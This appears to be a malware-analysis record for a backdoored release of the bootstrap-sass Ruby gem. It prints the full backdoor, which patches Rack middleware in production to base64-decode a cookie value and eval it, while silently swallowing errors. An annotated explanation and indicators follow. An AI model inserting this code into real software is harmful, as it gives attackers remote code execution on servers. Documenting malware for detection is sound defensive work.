package_info.why_malicious: Version 3.2.0.3 of bootstrap-sass contains a stealthy backdoor in a new file (lib/active-controller/middleware.rb) that enables remote code execution by evaluating attacker-supplied code from a specially crafted HTTP cookie. This allows attackers to execute arbitrary code on any server running the affected version, representing a severe compromise of application integrity and security.

execution_context.trigger: import-time (when the gem is loaded in a Rails application, especially in production)

malicious_snippets.code_snippet:
begin
 require 'rack/sendfile'
 if Rails.env.production?
   Rack::Sendfile.tap do |r|
     r.send :alias_method, :c, :call
     r.send(:define_method, :call) do |e|
       begin
         x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
         eval(x) if x
       rescue Exception
       end
       c(e)
     end
   end
 end
rescue Exception
 nil
end
malicious_snippets.code_behavior: At import-time in production environments, the code monkey-patches Rack::Sendfile's call method to extract the ___cfduid cookie from incoming HTTP requests, base64-decodes its value, and evaluates it as Ruby code at runtime, enabling remote code execution by anyone who can control the cookie.

malice_analysis.why_suspicious: The code dynamically alters a core middleware method to execute arbitrary code from a client-supplied cookie, which is a classic backdoor technique. This is highly abnormal and dangerous, as it allows attackers to run any code on the server.
malice_analysis.violated_expectations: Normal middleware should not execute code from user-supplied cookies, nor should it redefine core methods at runtime. The expected behavior is to process requests securely, not to introduce dynamic code execution paths.
malice_analysis.similar_legitimate_use: Monkey-patching is sometimes used in Ruby for legitimate bug fixes or instrumentation, but never to execute user-supplied code from cookies.

Use of eval on decoded cookie data
Conditional execution only in production environment
Silent exception handling to avoid detection
